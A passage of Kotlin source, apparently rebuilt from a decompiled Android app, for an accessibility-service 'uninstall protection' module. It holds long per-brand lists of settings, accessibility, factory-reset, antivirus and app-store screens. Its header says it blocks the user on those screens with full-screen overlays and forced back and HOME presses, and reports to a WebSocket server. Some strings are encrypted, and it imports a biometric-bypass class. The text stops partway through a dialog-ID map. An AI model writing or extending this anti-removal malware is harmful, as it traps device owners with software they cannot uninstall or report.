package com.storm.safe.rock.service.modules.protection

import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.DisplayMetrics
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.service.modules.BiometricBypassDelegate
import com.storm.safe.rock.util.StringUtil
import org.json.JSONArray
import org.json.JSONObject
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Phase 9: UninstallProtectionManager — 反卸载保护管理器
 *
 * JADX: C0355a0.java (2282 行, 31 个方法)
 *
 * 功能:
 * - 监控桌面卸载对话框 (品牌特定 ViewId + 文字匹配)
 * - 监控应用管理/安全中心等敏感 Activity (ClassName 检测)
 * - 监控第三方安全应用/应用商店/包安装器
 * - 检测到威胁时: 全屏遮挡 + 连续返回 + HOME
 * - 品牌特定处理: 荣耀桌面卸载对话框点击"从桌面移除"
 * - 定期后台轮询危险包名
 * - 上报事件到 WebSocket 服务器
 */
class UninstallProtectionManager(
    private val service: MyAccessibilityService,
    private val serviceRef: MyAccessibilityService,
    // ADAPT: coroutineScope param omitted — use Thread for async
) {
    companion object {
        const val TAG = "UninstallProtectionMgr"
        const val POLLING_THREAD_NAME = "UninstallPolling"

        // ==================== 时间常量 ====================

        const val SYSTEMUI_DEDUP_MS = 1000L
        const val POLLING_INTERVAL_MS = 300L
        const val POLLING_MAX_DURATION_MS = 120000L
        const val EVENT_DEDUP_MS = 2000L
        const val OVERLAY_TIMEOUT_MS = 60000L
        const val DESKTOP_MONITOR_TIMEOUT_MS = 30000L
        const val APP_NAME_CACHE_TTL_MS = 60000L

        // ==================== 节点遍历限制 ====================

        const val NODE_DEPTH_LIMIT = 15
        const val NODE_TEXT_LIMIT = 80
        const val NODE_TEXT_MAX_LEN = 100

        // ==================== 窗口参数 ====================

        const val OVERLAY_WINDOW_TYPE = 2032
        const val OVERLAY_WINDOW_FLAGS = 296
        const val OVERLAY_GRAVITY = 51 // Gravity.TOP | Gravity.START
        const val OVERLAY_PIXEL_FORMAT = -3

        // ==================== 加密的 SharedPrefs key ====================

        // JADX f53634f0 — SharedPreferences 文件名
        val PREFS_NAME: String = StringUtil.decrypt("PlcYNF4sDSJbDjtLHi5IOxgnWD8USQM/Sw==")

        // ==================== 纯净模式关键词 ====================

        val PURE_MODE_KEYWORDS = arrayOf("纯净模式", "純淨模式", "Pure Mode")

        val ENHANCED_PROTECTION_KEYWORDS = arrayOf(
            "增强防护", "增強防護", "Enhanced protection",
            "持续保护中", "持續保護中"
        )

        // ==================== 敏感 Activity 类名列表 ====================

        val SETTINGS_SENSITIVE_CLASSNAMES = arrayOf(
            "com.android.settings.applications.InstalledAppDetailsTop",
            "com.android.settings.applications.InstalledAppDetails",
            "com.android.settings.applications.InstalledAppDetailsActivity",
            "com.android.settings.SubSettings",
            "com.android.settings.Settings\$AppInfoSettingsActivity",
            "com.android.settings.applications.ManageApplications",
            "android.settings.APPLICATION_DETAILS_SETTINGS",
            "com.android.settings.accessibility.AccessibilitySettings",
            "com.android.settings.accessibility.AccessibilitySettingsForSetupWizard",
            "com.android.settings.Settings\$AccessibilitySettingsActivity",
            "com.android.settings.accessibility.VolumeShortcutToggleAccessibilityServicePreferenceFragment",
            "com.android.settings.accessibility.ToggleAccessibilityServicePreferenceFragment",
            "com.android.settings.Settings\$PrivacySettingsActivity",
            "com.android.settings.Settings\$FactoryResetActivity",
            "com.android.settings.Settings\$ResetActivity",
            "com.android.settings.backup.BackupSettingsActivity",
            "com.android.settings.MasterClear",
            "com.android.settings.MasterClearConfirm",
            "com.android.settings.Settings\$SystemDashboardActivity"
        )

        val OPPO_SENSITIVE_CLASSNAMES = arrayOf(
            "com.oplus.powermanager.fuelgaue.PowerControlActivity",
            "com.coloros.powermanager.fuelgaue.PowerControlActivity",
            "com.coloros.safecenter.permission.startup.StartupAppListActivity",
            "com.coloros.safecenter.appmanager.AppDetailActivity",
            "com.oplus.battery.BatteryAppDetailActivity",
            "com.coloros.battery.BatteryAppDetailActivity",
            "com.oppo.safe.permission.startup.StartupAppListActivity",
            "com.oplus.safecenter.permission.startup.StartupAppListActivity",
            "com.coloros.safecenter.appmanager.AppListActivity",
            "com.coloros.safecenter.appmanager.AppManagerActivity",
            "com.coloros.safecenter.softwarestore.InstalledAppActivity",
            "com.oplus.safecenter.appmanager.AppListActivity",
            "com.oplus.safecenter.appmanager.AppManagerActivity",
            "com.oplus.safecenter.appmanager.AppDetailActivity",
            "com.heytap.market.ui.InstalledAppActivity",
            "com.heytap.market.ui.AppDetailActivity",
            "com.oppo.market.ui.InstalledAppActivity",
            "com.coloros.accessibilityservice.AccessibilitySettingsActivity",
            "com.oplus.accessibilityservice.AccessibilitySettingsActivity",
            "com.coloros.safecenter.privacy.PrivacySettingsActivity",
            "com.oplus.safecenter.privacy.PrivacySettingsActivity"
        )

        val XIAOMI_SENSITIVE_CLASSNAMES = arrayOf(
            "com.miui.appmanager.ApplicationsDetailsActivity",
            "com.miui.securitycenter.permission.AppPermissionsEditorActivity",
            "com.miui.permcenter.autostart.AutoStartManagementActivity",
            "com.miui.powerkeeper.ui.HiddenAppsConfigActivity",
            "com.miui.appmanager.AppManageriuzxujjtqev",
            "com.miui.appmanager.InstalledAppListActivity",
            "com.miui.securitycenter.appmanager.AppListActivity",
            "com.miui.securitycenter.appmanager.InstalledAppListActivity",
            "com.miui.home.recents.RecentsActivity",
            "com.xiaomi.market.ui.InstalledAppActivity",
            "com.xiaomi.market.ui.AppDetailActivity",
            "com.miui.packageinstaller.ui.UninstallAppListActivity",
            "com.miui.accessibilityservice.AccessibilitySettingsActivity",
            "com.android.settings.Settings\$AccessibilitySettingsActivity",
            "com.miui.securitycenter.settings.ResetSettingsActivity"
        )

        val VIVO_SENSITIVE_CLASSNAMES = arrayOf(
            "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity",
            "com.vivo.permissionmanager.activity.PurviewTabActivity",
            "com.iqoo.powersaving.fuelgauge.PowerRankActivity",
            "com.iqoo.powersaving.PowerSavingManagerActivity",
            "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity",
            "com.vivo.abe.activity.AppDetailActivity",
            "com.bbk.appstore.ui.AppDetailActivity",
            "com.vivo.appfilter.AppFilterActivity",
            "com.vivo.appmanager.AppManagerActivity",
            "com.vivo.appmanager.InstalledAppActivity",
            "com.bbk.appstore.ui.InstalledAppActivity",
            "com.bbk.appstore.ui.AppListActivity",
            "com.vivo.securitycenter.appmanager.AppListActivity",
            "com.iqoo.securitycenter.appmanager.AppListActivity",
            "com.iqoo.secure.iuzxujjtqevV2",
            "com.iqoo.secure.clean.PhoneCleanActivity2",
            "com.iqoo.secure.safeguard.AppManagerActivity",
            "com.iqoo.secure.safeguard.InstalledAppActivity",
            "com.iqoo.secure.ui.phoneoptimize.SoftwareManagerActivity",
            "com.iqoo.secure.ui.phoneoptimize.InstalledAppListActivity",
            "com.iqoo.secure.ui.phoneoptimize.AppDetailActivity",
            "com.vivo.settings.accessibility.AccessibilitySettingsActivity",
            "com.bbk.settings.accessibility.AccessibilitySettingsActivity",
            "com.vivo.settings.FactoryResetActivity",
            "com.bbk.settings.FactoryResetActivity",
            "com.vivo.settings.backup.BackupSettingsActivity"
        )

        val HUAWEI_SENSITIVE_CLASSNAMES = arrayOf(
            "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity",
            "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity",
            StringUtil.decrypt("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQoAzccOl48IkMUdF0qAy1SIjgXIShCLAktQxAoTRgsRCwV"),
            "com.huawei.systemmanager.mainscreen.MainScreenActivity",
            "com.huawei.systemmanager.appinfo.AppInfoActivity",
            "com.huawei.systemmanager.appmanager.AppManagerActivity",
            "com.huawei.systemmanager.spaceclean.ui.softwaremanager.InstalledAppActivity",
            "com.huawei.appmarket.ui.InstalledAppActivity",
            "com.huawei.appmarket.ui.AppDetailActivity",
            "com.huawei.settings.accessibility.AccessibilitySettingsActivity",
            "com.huawei.settings.resetnetwork.ResetSettingsActivity",
            "com.huawei.systemmanager.backup.BackupSettingsActivity"
        )

        val HONOR_SENSITIVE_CLASSNAMES = arrayOf(
            "com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity",
            "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity",
            "com.hihonor.systemmanager.mainscreen.MainScreenActivity",
            "com.hihonor.systemmanager.app.AppListActivity",
            "com.hihonor.systemmanager.optimize.process.AppListActivity",
            "com.hihonor.systemmanager.appinfo.AppInfoActivity",
            "com.hihonor.systemmanager.spaceclean.ui.softwaremanager.InstalledAppActivity",
            "com.hihonor.devicemanager.mainscreen.MainScreenActivity",
            "com.hihonor.settings.accessibility.AccessibilitySettingsActivity",
            "com.hihonor.settings.resetnetwork.ResetSettingsActivity"
        )

        val SAMSUNG_SENSITIVE_CLASSNAMES = arrayOf(
            "com.samsung.android.lool.ManagerActivity",
            "com.samsung.android.sm.ui.battery.AppSleepListActivity",
            "com.samsung.android.sm.ui.appmanager.AppManagerActivity",
            "com.samsung.android.sm.ui.appmanager.InstalledAppActivity",
            "com.samsung.android.sm.ui.appmanager.AppListActivity",
            "com.samsung.android.voc.ui.InstalledAppActivity",
            "com.sec.android.app.samsungapps.InstalledAppActivity",
            "com.sec.android.app.samsungapps.AppDetailActivity"
        )

        val MEIZU_SENSITIVE_CLASSNAMES = arrayOf(
            "com.meizu.safe.permission.Permissioniuzxujjtqev",
            StringUtil.decrypt("KFYcdEA9BTRCfzhYFz8DCwktQiMiTQgZSDYYK0UQKE0YLEQsFQ=="),
            "com.meizu.safe.appmanager.AppListActivity",
            "com.meizu.safe.appmanager.AppDetailActivity",
            "com.meizu.safe.powerui.PowerAppDetailActivity",
            "com.meizu.mstore.ui.InstalledAppActivity"
        )

        val OTHER_SENSITIVE_CLASSNAMES = arrayOf(
            "com.motorola.settings.accessibility.AccessibilitySettingsActivity",
            "com.lge.lgworld.InstalledAppActivity",
            "com.nothing.settings.accessibility.AccessibilitySettingsActivity",
            "com.asus.mobilemanager.iuzxujjtqev",
            "com.asus.mobilemanager.powersaver.PowerSaverSettings",
            "com.zte.heartyservice.appmanager.AppManagerActivity",
            "com.lenovo.safecenter.MainTabActivity",
            "com.lenovo.safecenter.appmanager.AppManagerActivity",
            "com.transsion.phonemanager.MainTabActivity",
            "cn.nubia.security.appmanager.AppManagerActivity",
            "com.smartisanos.security.SecurityActivity"
        )

        // ==================== 安装器包名 ====================

        val PACKAGE_INSTALLER_PACKAGES = arrayOf(
            "com.android.packageinstaller", "com.google.android.packageinstaller",
            "com.samsung.android.packageinstaller", "com.sec.android.packageinstaller",
            "com.miui.packageinstaller", "com.huawei.packageinstaller",
            "com.hihonor.packageinstaller", "com.oppo.packageinstaller",
            "com.coloros.packageinstaller", "com.oplus.packageinstaller",
            "com.realme.packageinstaller", "com.oneplus.packageinstaller",
            "com.vivo.packageinstaller", "com.bbk.packageinstaller",
            "com.iqoo.packageinstaller", "com.meizu.packageinstaller",
            "com.lge.appbox.installer", "com.lge.packageinstaller",
            "com.motorola.packageinstaller", "com.lenovo.packageinstaller",
            "com.zte.packageinstaller", "cn.nubia.packageinstaller",
            "com.nothing.packageinstaller", "com.asus.packageinstaller",
            "com.evenwell.packageinstaller", "com.nokia.packageinstaller",
            "com.sonymobile.packageinstaller", "com.sony.packageinstaller",
            "com.transsion.packageinstaller", "com.tecno.packageinstaller",
            "com.infinix.packageinstaller", "com.itel.packageinstaller",
            "com.smartisanos.packageinstaller", "com.coolpad.packageinstaller",
            "com.yulong.packageinstaller"
        )

        // ==================== 安全应用包名 ====================

        val QIHOO_PACKAGES = arrayOf(
            "com.qihoo360.mobilesafe", "com.qihoo360.mobilesafe.lite",
            "com.qihoo.cleaner", "com.qihoo360.antivirus",
            "com.qihoo.appstore", "com.qihoo360.superroot"
        )

        val TENCENT_PACKAGES = arrayOf(
            "com.tencent.qqpimsecure", "com.tencent.token", "com.tencent.wifimanager"
        )

        val VIVO_SECURITY_PACKAGES = arrayOf(
            StringUtil.decrypt("KFYcdEQpAyEZIi5aBChI"), "com.vivo.secure",
            "com.bbk.iqoo.secure",
            StringUtil.decrypt("KFYcdFsxGiEZMClc"),
            StringUtil.decrypt("KFYcdFsxGiEZIipfFDlINhgrRQ=="),
            "com.iqoo.safecenter", "com.vivo.securitycenter", "com.iqoo.securitycenter"
        )

        val GENERAL_SECURITY_PACKAGES = arrayOf(
            "com.cleanmaster.mguard", "com.cleanmaster.security",
            "com.kingsoft.security", "com.ksmobile.launcher",
            "com.ludashi.benchmark", "com.ludashi.security",
            "com.lenovo.safecenter", "com.baidu.antivirus",
            "com.ijinshan.kbackup", "com.dianxinos.optimizer",
            "com.lbe.security", "com.netease.nis",
            "cn.opda.a.phonoalbumshoushou", "com.ijinshan.duba"
        )

        // ==================== 系统安全管理器包名 ====================

        val SYSTEM_SECURITY_MANAGER_PACKAGES = arrayOf(
            StringUtil.decrypt("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"),
            "com.hihonor.systemmanager", "com.hihonor.devicemanager",
            StringUtil.decrypt("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="),
            StringUtil.decrypt("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="),
            "com.oplus.safecenter",
            StringUtil.decrypt("KFYcdE43ACFFPjgXATJCNgkjVj8qXhQo"),
            StringUtil.decrypt("KFYcdEIoHCEZIipfFA=="),
            StringUtil.decrypt("KFYcdEQpAyEZIi5aBChI"),
            "com.vivo.secure", "com.bbk.iqoo.secure",
            StringUtil.decrypt("KFYcdFsxGiEZMClc"),
            StringUtil.decrypt("KFYcdFsxGiEZIipfFDlINhgrRQ=="),
            "com.iqoo.safecenter", "com.vivo.securitycenter", "com.iqoo.securitycenter",
            "com.samsung.android.sm", "com.samsung.android.sm_cn",
            "com.samsung.android.lool",
            "com.meizu.safe", "com.lenovo.safecenter",
            "com.oneplus.security", "com.asus.mobilemanager",
            "com.qihoo360.mobilesafe", "com.qihoo360.mobilesafe.lite",
            "com.tencent.qqpimsecure"
        )

        // ==================== 应用商店包名 ====================

        val APP_STORE_PACKAGES = arrayOf(
            "com.huawei.appmarket", "com.hihonor.appmarket",
            "com.xiaomi.market", "com.xiaomi.mipicks",
            "com.heytap.market", "com.oppo.market", "com.nearme.gamecenter",
            "com.bbk.appstore", "com.vivo.appstore",
            "com.samsung.android.voc", "com.sec.android.app.samsungapps",
            "com.meizu.mstore", "cn.nubia.neostore", "com.zte.market",
            "com.lenovo.leos.appstore", "com.motorola.appstore",
            "com.smartisanos.appstore", "com.yulong.android.coolmart",
            "com.gionee.aora.market", "com.transsion.store", "com.palmstore.app",
            "com.lge.lgworld", "com.asus.estore", "com.sonymobile.xperialounge",
            "com.amazon.venezia", "com.wandoujia.phoenix2",
            "com.tencent.android.qqdownloader", "com.baidu.appsearch",
            "com.android.vending", "com.coolapk.market"
        )

        // ==================== 启动器包名列表 (按品牌) ====================

        val HUAWEI_LAUNCHER_PACKAGES = arrayOf(
            "com.huawei.android.launcher", "com.huawei.home"
        )

        val HONOR_LAUNCHER_PACKAGES = arrayOf(
            "com.hihonor.android.launcher", "com.hihonor.home"
        )

        val OPPO_LAUNCHER_PACKAGES = arrayOf(
            StringUtil.decrypt("KFYcdEIoHCEZPSpMHzlFPR4="),
            "com.coloros.launcher", "com.android.launcher",
            "com.realme.launcher", "com.oneplus.launcher",
            "net.oneplus.launcher", "com.oplus.launcher"
        )

        val VIVO_LAUNCHER_PACKAGES = arrayOf(
            "com.bbk.launcher2",
            StringUtil.decrypt("KFYcdFsxGiEZPSpMHzlFPR4="),
            "com.vivo.launcher.two",
            StringUtil.decrypt("KFYcdE86B2BbMD5XEjJIKg=="),
            StringUtil.decrypt("KFYcdEQpAyEZPSpMHzlFPR4="),
            "com.iqoo.launcher.two"
        )

        val XIAOMI_LAUNCHER_PACKAGES = arrayOf(
            "com.miui.home", "com.mi.android.globalFileexplorer"
        )

        val SAMSUNG_LAUNCHER_PACKAGES = arrayOf(
            "com.samsung.android.launcher", "com.sec.android.app.launcher"
        )

        val MEIZU_LAUNCHER_PACKAGES = arrayOf(
            "com.meizu.launcher", "com.meizu.flyme.launcher", "com.meizu.launcher3"
        )

        val GOOGLE_LAUNCHER_PACKAGES = arrayOf(
            "com.google.android.apps.nexuslauncher",
            "com.android.launcher3", "com.android.launcher2"
        )

        val OTHER_LAUNCHER_PACKAGES = arrayOf(
            "com.lenovo.launcher", "com.lenovo.launcher2",
            "com.transsion.launcher", "com.infinix.launcher",
            "com.tecno.launcher", "com.itel.launcher",
            "com.zte.mifavor.launcher", "cn.nubia.launcher",
            "com.motorola.launcher3", "com.motorola.launcher",
            "com.lge.launcher2", "com.lge.launcher3",
            "com.nothing.launcher", "com.asus.launcher",
            "com.asus.zenui.launcher", "com.evenwell.launcher",
            "com.nokia.launcher", "com.sonymobile.home",
            "com.sony.home", "com.sonyericsson.home",
            "com.smartisanos.launcher", "com.yulong.android.launcher",
            "com.gionee.launcher", "com.action.launcher",
            "com.teslacoilsw.launcher", "com.microsoft.launcher",
            "com.niagara.launcher"
        )

        // ==================== 品牌别名映射 ====================

        val BRAND_ALIASES: Map<String, String> = mapOf(
            "iqoo" to "vivo", "bbk" to "vivo",
            "redmi" to "xiaomi", "poco" to "xiaomi", "blackshark" to "xiaomi",
            "realme" to "oppo", "oneplus" to "oppo", "oplus" to "oppo", "coloros" to "oppo",
            "hihonor" to "honor",
            "sec" to "samsung",
            "tecno" to "transsion", "infinix" to "transsion", "itel" to "transsion"
        )

        // ==================== 默认对话框 ViewId ====================

        val DEFAULT_DIALOG_VIEW_IDS = arrayOf("android:id/message", "android:id/alertTitle")

        // ==================== 静态检测方法 ====================

        /**
         * JADX d3 — 检测高危 ClassName (无障碍、恢复出厂、设备管理器)
         */
        fun isHighRiskClassName(className: String): Boolean {
            val lc = className.lowercase(Locale.ROOT)

            // 无障碍设置页
            if (lc.contains("accessibilitysettings") ||
                lc.contains("toggleaccessibilityservice") ||
                lc.contains("accessibilityserviceinfo") ||
                lc.contains("accessibilitydetail") ||
                lc.contains("accessibilitylist")
            ) return true

            // 恢复出厂 (排除网络重置和密码重置)
            val isResetPage = lc.contains("masterclear") || lc.contains("factoryreset") ||
                    lc.contains("erasedatasettings") || lc.contains("wipedata") ||
                    lc.contains("resetphone") || lc.contains("systemreset") ||
                    lc.contains("backupandreset") || lc.contains("backupreset") ||
                    lc.contains("resetoptions") || lc.contains("restoredefault") ||
                    lc.contains("misystemresetactivity") || lc.contains("restorephone") ||
                    lc.contains("phonerestorefragment") || lc.contains("erasephone") ||
                    lc.contains("clearalldataactivity") || lc.contains("resetconfirm") ||
                    lc.contains("erasealldata") ||
                    (lc.contains("coloros") && (lc.contains("reset") || lc.contains("restore") || lc.contains("erase") || lc.contains("privacy"))) ||
                    (lc.contains("oplus") && (lc.contains("reset") || lc.contains("restore") || lc.contains("erase") || lc.contains("privacy"))) ||
                    (lc.contains("funtouch") && lc.contains("reset")) ||
                    (lc.contains("huawei") && lc.contains("resetsettings")) ||
                    (lc.contains("hihonor") && lc.contains("resetsettings"))

            if (isResetPage &&
                !lc.contains("resetnetwork") && !lc.contains("networkreset") &&
                !lc.contains("passwordreset") && !lc.contains("resetpassword")
            ) return true

            // 设备管理器
            if (lc.contains("deviceadmin") || lc.contains("devicepolicyadmin")) return true

            return false
        }

        /**
         * JADX d0 — 检测敏感 ClassName (应用详情、应用列表、自启动、电池、杀毒)
         */
        fun isSensitiveClassName(className: String): Boolean {
            val lc = className.lowercase(Locale.ROOT)

            // 恢复出厂/隐私相关 — 这些由 isHighRiskClassName 处理，d0 直接返回 false
            if (lc.contains("reset") || lc.contains("factory") || lc.contains("backup") ||
                lc.contains("privacy") || lc.contains("masterclear") ||
                lc.contains("wipe") || lc.contains("erase") || lc.contains("deviceadmin")
            ) {
                return false
            }

            // 应用详情页
            if (lc.contains("installedappdetails") || lc.contains("appinfosettings") ||
                lc.contains("applicationsdetails") || lc.contains("appdetail") ||
                lc.contains("applicationinfo") || lc.contains("appinfoactivity") ||
                lc.contains("packageinfo")
            ) return true

            // 应用列表页
            if (lc.contains("manageapplications") || lc.contains("manageapps") ||
                lc.contains("apppermissions") || lc.contains("permissiondetail") ||
                lc.contains("applist") || lc.contains("applicationlist") ||
                lc.contains("allapps") || lc.contains("installedapps") ||
                lc.contains("installedapp") || lc.contains("appmanager") ||
                lc.contains("applicationsmanager") || lc.contains("softwaremanager") ||
                lc.contains("spaceclean")
            ) return true

            // 自启动管理
            if (lc.contains("startupapp") || lc.contains("autostart") ||
                lc.contains("selfstart") || lc.contains("autostartmanage") ||
                lc.contains("startupmanage")
            ) return true

            // 进程保护
            if (lc.contains("protect") || lc.contains("appcontrol") ||
                lc.contains("backgroundapp") || lc.contains("backgroundmanage") ||
                lc.contains("runningapp") || lc.contains("runningservice")
            ) return true

            // 电池/耗电
            if (lc.contains("batteryusage") || lc.contains("powerusage") ||
                lc.contains("fuelgauge") || lc.contains("powerrank") ||
                lc.contains("appbattery") || lc.contains("powercontrol") ||
                lc.contains("batterydetail") || lc.contains("excessivepower") ||
                (lc.contains("battery") && (lc.contains("app") || lc.contains("detail")))
            ) return true

            // 杀毒/安全扫描
            if (lc.contains("antivirus") || lc.contains("virus") ||
                lc.contains("securityscan") || lc.contains("scanner") ||
                lc.contains("malware") || lc.contains("threat") ||
                lc.contains("securitycenter")
            ) return true

            return false
        }

        /**
         * JADX d2 — 检测包名是否为安全管理器
         */
        fun isSecurityManagerPackage(pkg: String): Boolean {
            val lc = pkg.lowercase(Locale.ROOT)
            return lc.contains("devicemanager") || lc.contains("systemmanager") ||
                    lc.contains("securitycenter") || lc.contains("antivirus") ||
                    lc.contains("safecenter") || lc.contains("packageinstaller")
        }

        /**
         * JADX d5 — 检测包名是否为已知 Launcher
         */
        fun isLauncherPackage(pkg: String): Boolean {
            for (s in HUAWEI_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in HONOR_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in OPPO_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in VIVO_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in XIAOMI_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in SAMSUNG_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in MEIZU_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in GOOGLE_LAUNCHER_PACKAGES) if (pkg == s) return true
            for (s in OTHER_LAUNCHER_PACKAGES) if (pkg == s) return true
            return false
        }

        /**
         * JADX d6 — 检测包名是否为敏感包
         */
        fun isSensitivePackage(pkg: String): Boolean {
            val lc = pkg.lowercase(Locale.ROOT)
            if (isSecurityManagerPackage(lc)) return true
            if (lc.startsWith("com.android.settings") || lc.startsWith("com.android.provision") ||
                lc.startsWith("com.android.permissioncontroller") ||
                lc.startsWith("com.google.android.permissioncontroller")
            ) return true
            if (lc.contains("phonemanager") || lc.contains("permissionmanager") ||
                lc.contains("appmanager")
            ) return true

            // Brand-specific settings/security
            val brandPrefixes = arrayOf(
                StringUtil.decrypt("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"),
                "com.huawei.settings", "com.hihonor.systemmanager",
                "com.hihonor.settings", "com.hihonor.devicemanager",
                StringUtil.decrypt("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="),
                "com.miui.appmanager", "com.miui.permcenter",
                StringUtil.decrypt("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="),
                "com.oplus.safecenter", "com.oplus.battery", "com.coloros.battery",
                StringUtil.decrypt("KFYcdE43ACFFPjgXATJCNgkjVj8qXhQo"),
                StringUtil.decrypt("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo="),
                StringUtil.decrypt("KFYcdFsxGiEZMClc"),
                "com.vivo.appfilter",
                StringUtil.decrypt("KFYcdEQpAyEZIi5aBChI"),
                "com.iqoo.powersaving",
                "com.samsung.android.sm", "com.samsung.android.lool",
                "com.oneplus.security", "com.asus.mobilemanager",
                "com.meizu.safe", "com.meizu.flyme.security",
                "com.bbk.settings", "com.vivo.settings",
                "com.coloros.settings", "com.oplus.settings",
                "com.samsung.android.settings"
            )
            for (prefix in brandPrefixes) {
                if (lc.startsWith(prefix)) return true
            }

            for (pkg2 in QIHOO_PACKAGES) if (lc.startsWith(pkg2)) return true
            for (pkg2 in TENCENT_PACKAGES) if (lc.startsWith(pkg2)) return true
            for (pkg2 in VIVO_SECURITY_PACKAGES) if (lc.startsWith(pkg2)) return true
            for (pkg2 in GENERAL_SECURITY_PACKAGES) if (lc.startsWith(pkg2)) return true
            for (pkg2 in APP_STORE_PACKAGES) if (lc.startsWith(pkg2)) return true

            return false
        }

        /**
         * JADX d7 — 检测包名是否为系统安全管理器
         */
        fun isSystemSecurityManagerPackage(pkg: String): Boolean {
            val lc = pkg.lowercase(Locale.ROOT)
            for (s in SYSTEM_SECURITY_MANAGER_PACKAGES) {
                if (lc.startsWith(s)) return true
            }
            return false
        }

        /**
         * JADX b9 — 递归提取节点文本 (深度限制 15, 总数限制 80)
         */
        fun collectNodeTexts(depth: Int, node: AccessibilityNodeInfo, result: ArrayList<String>) {
            if (depth > NODE_DEPTH_LIMIT || result.size > NODE_TEXT_LIMIT) return
            try {
                if (node.isVisibleToUser) {
                    val text = node.text?.toString()?.trim()
                    if (!text.isNullOrBlank() && text.length < NODE_TEXT_MAX_LEN) {
                        result.add(text)
                    }
                    val desc = node.contentDescription?.toString()?.trim()
                    if (!desc.isNullOrBlank() && desc.length < NODE_TEXT_MAX_LEN && !result.contains(desc)) {
                        result.add(desc)
                    }
                }
                val childCount = node.childCount
                for (i in 0 until childCount) {
                    if (result.size > NODE_TEXT_LIMIT) break
                    val child = node.getChild(i)
                    if (child != null) {
                        try {
                            collectNodeTexts(depth + 1, child, result)
                        } finally {
                            try { child.recycle() } catch (_: Exception) {}
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        // ==================== 品牌卸载对话框 ViewId 映射 (JADX f53705e0) ====================

        /**
         * 23 个品牌的桌面卸载对话框 ViewId
         * JADX: AbstractC0770a1.m213614f9(new Pair("oppo", ...), ...)
         */
        val BRAND_DIALOG_VIEW_IDS: Map<String, List<String>> = mapOf(
            "oppo" to listOf(
                "com.oppo.launcher:id/alertTitle", "com.oppo.launcher:id/message",
                "com.oppo.launcher:id/txt_uninstall_main_title", "com.oppo.launcher:id/txt_uninstall_sub_title",
                "com.oppo.launcher:id/dialog_title", "com.oppo.launcher:id/dialog_content",
                "com.oplus.launcher:id/alertTitle", "com.oplus.launcher:id/message",
                "com.oplus.launcher:id/txt_uninstall_main_title", "com.oplus.launcher:id/txt_uninstall_sub_title",
                "com.oplus.launcher:id/dialog_title", "com.oplus.launcher:id/dialog_content",
                "com.coloros.launcher:id/alertTitle", "com.coloros.launcher:id/message",
                "com.coloros.launcher:id/txt_uninstall_main_title", "com.coloros.launcher:id/txt_uninstall_sub_title",
                "com.coloros.launcher:id/dialog_title", "com.coloros.launcher:id/dialog_content",
                "com.android.launcher:id/alertTitle", "com.android.launcher:id/message",
                "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title",
                "com.android.launcher:id/dialog_title", "com.android.launcher:id/dialog_content"
            ),
            "realme" to listOf(
                "com.realme.launcher:id/alertTitle", "com.realme.launcher:id/message",
                "com.realme.launcher:id/txt_uninstall_main_title", "com.realme.launcher:id/txt_uninstall_sub_title",
                "com.realme.launcher:id/dialog_title", "com.realme.launcher:id/dialog_content",
                "com.realme.launcher:id/uninstall_dialog_title",
                "com.android.launcher:id/alertTitle", "com.android.launcher:id/message",
                "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title",
                "com.android.launcher:id/dialog_title", "com.android.launcher:id/dialog_content"
            ),
            "oneplus" to listOf(
                "com.oneplus.launcher:id/alertTitle", "com.oneplus.launcher:id/message",
                "com.oneplus.launcher:id/txt_uninstall_main_title", "com.oneplus.launcher:id/txt_uninstall_sub_title",
                "com.oneplus.launcher:id/dialog_title", "com.oneplus.launcher:id/dialog_content",
                "net.oneplus.launcher:id/alertTitle", "net.oneplus.launcher:id/message",
                "net.oneplus.launcher:id/txt_uninstall_main_title", "net.oneplus.launcher:id/txt_uninstall_sub_title",
                "net.oneplus.launcher:id/dialog_title", "net.oneplus.launcher:id/dialog_content",
                "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title"
            ),
            "vivo" to listOf(
                "com.bbk.launcher2:id/uninstall_title", "com.bbk.launcher2:id/uninstall_app_des",
                "com.bbk.launcher2:id/uninstall_gridview", "com.bbk.launcher2:id/message",
                "com.bbk.launcher2:id/alertTitle", "com.bbk.launcher2:id/dialog_title",
                "com.bbk.launcher2:id/dialog_content",
                "com.vivo.launcher:id/uninstall_title", "com.vivo.launcher:id/uninstall_app_des",
                "com.vivo.launcher:id/alertTitle", "com.vivo.launcher:id/message",
                "com.vivo.launcher:id/dialog_content", "com.vivo.launcher:id/dialog_title",
                "com.vivo.launcher.two:id/uninstall_title", "com.vivo.launcher.two:id/uninstall_app_des",
                "com.vivo.launcher.two:id/alertTitle", "com.vivo.launcher.two:id/message",
                "com.vivo.launcher.two:id/dialog_content", "com.vivo.launcher.two:id/dialog_title",
